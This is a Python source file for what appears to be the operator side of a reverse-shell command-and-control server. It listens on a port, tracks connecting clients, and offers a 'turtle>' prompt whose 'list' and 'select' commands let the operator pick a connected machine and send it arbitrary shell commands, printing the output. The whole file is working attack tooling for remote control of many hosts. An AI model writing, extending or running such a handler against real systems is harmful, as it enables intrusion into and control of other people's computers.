import threading
import socket
from queue import Queue

HOST = "xxx.xxx.xxx.xxx"
PORT = 5000

NO_OF_THREADS = 2

q = Queue()

curr_conn = []
curr_addr = []

# Protect shared connection lists
conn_lock = threading.Lock()

s = None


def create_socket():
    global s

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Allows the server to restart without waiting for the old socket
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        s.bind((HOST, PORT))
        s.listen(10)

        print(f"Server listening on {HOST}:{PORT}")

    except Exception as err:
        print(f"Socket error: {err}")


# Thread 1
def accept_connections():

    while True:
        try:
            conn, addr = s.accept()
            conn.setblocking(True)

            with conn_lock:
                curr_conn.append(conn)
                curr_addr.append(addr)

            print(f"\nConnection established with {addr[0]}:{addr[1]}")
            print("turtle> ", end="", flush=True)

        except Exception as err:
            print(f"Accept error: {err}")


# Thread 2
def start_turtle():

    while True:

        try:
            cmd = input("turtle> ").strip()

        except (EOFError, KeyboardInterrupt):
            print("\nExiting...")
            break

        if not cmd:
            continue

        if cmd == "list":
            list_connection()

        elif cmd.startswith("select "):
            conn = get_target(cmd)

            if conn is not None:
                send_target_commands(conn)

        elif cmd == "exit":
            print("Exiting...")
            break

        else:
            print("Invalid command")


# Display active connections
def list_connection():

    dead_connections = []

    with conn_lock:
        connections = list(zip(curr_conn, curr_addr))

    result = []

    for i, (conn, addr) in enumerate(connections):

        try:
            # Check whether the connection is still usable.
            # NOTE: this assumes the client responds to this byte.
            conn.sendall(b" ")

            result.append(
                f"{i} {addr[0]}:{addr[1]}"
            )

        except (socket.error, OSError):
            dead_connections.append(conn)

    # Remove dead connections safely
    if dead_connections:
        with conn_lock:
            for conn in dead_connections:
                if conn in curr_conn:
                    index = curr_conn.index(conn)

                    curr_conn.pop(index)
                    curr_addr.pop(index)

                try:
                    conn.close()
                except Exception:
                    pass

    print("\n____ Clients ____")

    if result:
        print("\n".join(result))
    else:
        print("No active clients.")

    print()


# Select a client
def get_target(cmd):

    try:
        target = cmd.replace("select ", "", 1).strip()
        target = int(target)

        with conn_lock:

            if target < 0 or target >= len(curr_conn):
                print("Invalid client number.")
                return None

            conn = curr_conn[target]
            addr = curr_addr[target]

        print(f"You are now connected to {addr[0]}:{addr[1]}")

        return conn

    except ValueError:
        print("Selection won't work: enter a valid client number.")
        return None

    except Exception as err:
        print(f"Selection won't work: {err}")
        return None


# Send commands to selected client
def send_target_commands(connection):

    while True:

        try:
            cmd = input(">>> ").strip()

            if cmd == "exit":
                break

            if not cmd:
                continue

            connection.sendall(cmd.encode())

            client_res = connection.recv(20480)

            if not client_res:
                print("Client disconnected.")
                break

            print(client_res.decode("utf-8", errors="replace"), end="")

        except (ConnectionResetError, BrokenPipeError, ConnectionAbortedError):
            print("Client disconnected.")
            break

        except socket.timeout:
            print("Client response timed out.")

        except Exception as err:
            print(f"Communication error: {err}")
            break


# Create worker threads
def create_workers():

    for _ in range(NO_OF_THREADS):

        t = threading.Thread(
            target=work,
            daemon=True
        )

        t.start()


def create_jobs():

    q.put(1)
    q.put(2)

    # These jobs never finish because the worker functions
    # contain their main loops.
    q.join()


def work():

    while True:

        x = q.get()

        try:

            if x == 1:
                create_socket()
                accept_connections()

            elif x == 2:
                start_turtle()

        finally:
            q.task_done()


create_workers()
create_jobs()
